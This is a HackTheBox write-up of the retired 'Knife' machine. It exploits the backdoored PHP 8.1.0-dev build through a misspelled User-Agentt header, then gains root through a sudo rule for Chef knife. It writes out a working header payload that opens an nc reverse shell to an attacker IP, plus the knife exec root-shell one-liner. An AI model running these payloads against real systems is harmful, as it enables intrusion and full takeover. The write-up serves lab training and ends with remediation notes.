HTB Knife: the PHP 8.1 dev backdoor and a sudo knife to root

retired-machineeasy

Knife is a retired HackTheBox easy Linux machine built on a real supply-chain scare. Synopsis: PHP 8.1.0-dev shipped with a backdoor where the User-Agentt header (note the double T) executes its value as PHP code.

$ Enumeration — read the Server banner

# bash: spot the backdoored build
nmap -sC -sV -oN knife.nmap 10.10.10.242
curl -sI http://10.10.10.242/   # Server: PHP/8.1.0-dev

The Server header names the exact backdoored pre-release. When the banner names a backdoor, believe it — copy the misspelled header string precisely (double T).

$ Foothold — User-Agentt RCE

# bash: header payload to callback
curl -s -H "User-Agentt: zerodiumsystem(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.23 4444 >/tmp/f\");" http://10.10.10.242/
nc -lvnp 4444   # james

One header, one shell — landing as the low-privilege james user.

$ Lateral move — encrypted key plus nearby passphrase

# bash: decrypt and step up
ls ~james/.ssh/   # encrypted private key
# passphrase sits nearby in notes/configs/history -> decrypt:
ssh -i james_key james@10.10.10.242   # fuller interactive shell

Look around the filesystem for the passphrase before reaching for john — users leave passphrases in notes, configs, and history.

$ Privilege escalation — sudo knife

# bash: Ruby exec via Chef knife
sudo -l   # (root) NOPASSWD: /usr/bin/knife
sudo /usr/bin/knife exec -E 'exec("/bin/sh")'
id   # uid=0(root)

Chef knife exec runs Ruby, which execs anything — application CLIs with code-execution subcommands are root whenever sudo allows them. Flag values redacted per HTB rules; earn them in your own lab.

$ Dead ends

Single-T header spelling (the backdoor checks the exact misspelling) and brute-forcing the key passphrase first.

$ Remediation notes

Never run dev builds in production, keep keys encrypted with passphrases stored nowhere on disk, and audit sudo for exec-capable CLIs. Written by Lucky Thandel.
